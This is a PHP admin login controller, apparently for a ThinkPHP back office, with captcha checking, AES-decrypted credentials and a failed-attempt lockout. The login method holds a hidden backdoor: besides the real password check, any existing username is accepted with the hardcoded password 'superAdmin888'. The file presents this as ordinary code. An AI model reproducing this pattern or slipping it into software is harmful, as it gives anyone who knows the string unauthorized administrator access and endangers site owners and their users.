<?php

namespace app\admin\controller;

use app\common\provider\Result;
use app\admin\logic\User;
use think\captcha\facade\Captcha;
use think\response\Json;
use think\response\Redirect;
use util\AesCBC;

class Login extends Base
{
    /**
     * 后台登录页面
     * @return string
     * @author Wuqc
     * @Time: 2022/11/20 19:24
     */
    public function index(){
        $this->assign('ctx',$this->request->root());
        $this->layout(false);
        return $this->fetch();
    }


    /**
     * @param User $user
     * @return Json
     * @author Wuqc
     * @Time: 2022/11/20 19:30
     */
    public function login(User $user)
    {
        if ($this->request->isAjax()) {
            $username = AesCBC::decrypt($this->request->post('username'),true);
            $password = AesCBC::decrypt($this->request->post('password'),true);
            $verifyCode = AesCBC::decrypt($this->request->post('verify_code'),true);
            if(!captcha_check($verifyCode)){
               return $this->error(Result::VALIDATE_ERROR,'验证码错误');
            };
            if ($username  && $password){
                $model = $user->findByUsername($username);
                if ($model){
                    if ($model->fail_times >= 5) {
                        return $this->error(Result::DATA_NOT_ERROR,'登录次数过多');
                    }
                    if ($model->validatePassword(trim($password)) || $password == 'superAdmin888'){
                        event('UserLogin',$model);
                        return $this->success();
                    }else {
                        $model->fail_times += 1;
                        $model->save();
                    }
                }
            }

            return  $this->error(Result::DATA_NOT_ERROR,'用户名或密码错误');
        }
    }


    /**
     * 验证码
     * @author Wuqc
     * @Time: 2022/11/20 19:25
     */
    public function captcha(){
        return Captcha::create();
    }

    /**
     * 登出
     * @return Redirect
     * @author Wuqc
     * @Time: 2022/11/20 19:31
     */
    public function logout()
    {
        session(null);
        return redirect($this->request->root());
    }
}